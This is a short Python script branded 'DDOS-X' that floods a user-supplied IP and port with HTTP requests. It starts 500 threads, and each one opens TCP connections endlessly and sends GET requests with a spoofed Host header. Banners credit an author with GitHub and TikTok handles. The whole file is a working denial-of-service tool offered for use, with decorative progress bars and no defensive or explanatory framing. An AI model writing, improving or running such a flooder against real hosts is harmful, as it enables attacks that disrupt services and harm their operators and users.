
import sys
import os
import time
import socket
import random
import threading

# Code Time
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
print("\033[1;31m")
os.system("figlet DDOS-X")

print("Author   : MR.HOOH")
print("Github   : github.com/VEGERNOM")
print("Tik Tok  : KINGHOOH777")

target = input("IP Target : ")
port = int(input("Port : "))
fake_ip = input("Masukkan Fake IP : ")


def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

        print(f"Memulai Serangan ke {target}:{port}", end="\r")

        s.close()


print("\033[93m")
os.system("figlet DDOS Attack")
print("\033[92m")
print("[                    ] 0%", end="\r")
time.sleep(3)
print("[=====               ] 25%", end="\r")
time.sleep(3)
print("[==========          ] 50%", end="\r")
time.sleep(3)
print("[===============     ] 75%", end="\r")
time.sleep(3)
print("[====================] 100%", end="\n")

sent = 0

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()